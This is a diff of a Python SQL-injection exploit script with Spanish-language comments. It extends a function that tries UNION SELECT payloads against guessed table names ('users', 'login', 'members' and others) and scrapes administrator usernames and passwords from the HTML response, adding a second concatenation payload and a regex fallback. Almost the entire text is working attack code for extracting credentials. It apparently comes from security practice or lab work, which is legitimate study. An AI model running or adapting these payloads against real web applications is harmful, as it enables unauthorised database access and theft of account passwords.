@@ -3,7 +3,7 @@ from bs4 import BeautifulSoup
 import urllib3
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 import time
-import random
+import random, re
 from urllib.parse import urlparse
 from requests.exceptions import SSLError, ConnectionError
 
@@ -127,43 +127,66 @@ def exploit_sqli_users_table(url):
     """
     
     common_usernames = ['administrator', 'admin', 'root', 'superuser', 'sysadmin']
-    #sql_payload = "' UNION select username, password from users--"
     possible_tables = ['users', 'usuarios', 'user_accounts', 'login', 'members']
-    
-    for table in possible_tables:
-        sql_payload = f"' UNION select username, password from {table}--"
-        
-        try:
-            r = requests.get(url + sql_payload, verify=False, proxies=proxies, timeout=10)
-        except SSLError as e:
-            print(f"[-] SSL Error en {url}: {e}")
-            continue
-    
-        if "text/html" in r.headers.get("Content-Type", ""):
-            soup = BeautifulSoup(r.text, 'html.parser')
-        else:
-            #print("[-] The response is not HTML type.")
-            continue
-    
-        if not soup.body:
-            print("[-] The body is not in the HTML response.")
-            continue
-    
-        for username in common_usernames:
-            user_element = soup.body.find(string=username)
-            if user_element:
-                parent = user_element.parent
-                password_element = parent.findNext('td') if parent else None
-                
-                if password_element and password_element.contents:
-                    admin_password = password_element.contents[0]
-                    print(f"[+] User password found for '{username}': '{admin_password}' in table '{table}'")
+
+    def try_payload(sql_payload):
+        """
+        Internal helper function to test a SQL payload across all possible tables.
+        Returns True if a password is found, otherwise False.
+        """
+
+        for table in possible_tables:
+            payload_to_try = sql_payload.format(table=table)
+            #print(f"[DEBUG] Trying payload: {payload_to_try}")
+            try:
+                r = requests.get(url + payload_to_try, verify=False, proxies=proxies, timeout=10)
+            except SSLError as e:
+                print(f"[-] SSL Error en {url}: {e}")
+                continue
+
+            if "text/html" in r.headers.get("Content-Type", ""):
+                soup = BeautifulSoup(r.text, 'html.parser')
+            else:
+                #print(f"[-] La respuesta no es de tipo HTML con el payload: {payload_to_try}")
+                continue
+
+            if not soup.body:
+                #print(f"[-] No se encontró un cuerpo HTML válido con el payload: {payload_to_try}")
+                continue
+
+            for username in common_usernames:
+                user_element = soup.body.find(string=username)
+                if user_element:
+                    parent = user_element.parent
+                    password_element = parent.findNext('td') if parent else None
+
+                    if password_element and password_element.contents:
+                        admin_password = password_element.contents[0]
+                        print(f"[+] Found Password for '{username}': '{admin_password}' in table '{table}'")
+                        return True
+                    
+            admin_element = soup.find(text=re.compile(r'.*administrator.*'))
+            if admin_element:
+                try:
+                    admin_password = admin_element.split('*')[1]
+                    print(f"[+] Found Password for '{username}': '{admin_password}' in table '{table}'")
                     return True
-        #print(f"[-] No se encontraron usuarios comunes en la tabla '{table}'. Probando con otra tabla...")
-        #else:
-            #print(f"[-] User '{username}' not found in the response.")
-       
-    print(f"[-] Administrator credentials could not be exfiltrated")
+                except IndexError:
+                    print(f"[-] Failed to correctly extract the administrator password from the payload '{payload_to_try}'")
+
+            #print(f"[-] No se encontraron usuarios comunes en la tabla '{table}' con el payload '{payload_to_try}'")
+
+        return False
+
+    first_payload = "' UNION select username, password from {table}--"
+    if try_payload(first_payload):
+        return True
+
+    second_payload = "' UNION select NULL, username || '*' || password from {table}--"
+    if try_payload(second_payload):
+        return True
+
+    print(f"[-] No se pudieron extraer las credenciales del administrador")
     return False
 
 def exploit_sqli(url):
@@ -268,7 +291,7 @@ if __name__ == "__main__":
                 num_col = exploit_sqli_column_number(test_url)
                 if num_col:
                     #print(f"[+] Vulnerable URL found: {test_url}")
-                    print(f"We determined that your database has {num_col} columns at this URL, as the server did not handle exceptions properly during the SQL query.")
+                    print(f"[+] We determined that your database has {num_col} columns at this URL, as the server did not handle exceptions properly during the SQL query.")
                 else:
                     print("[-] URL not vulnerable to sql injection")
             
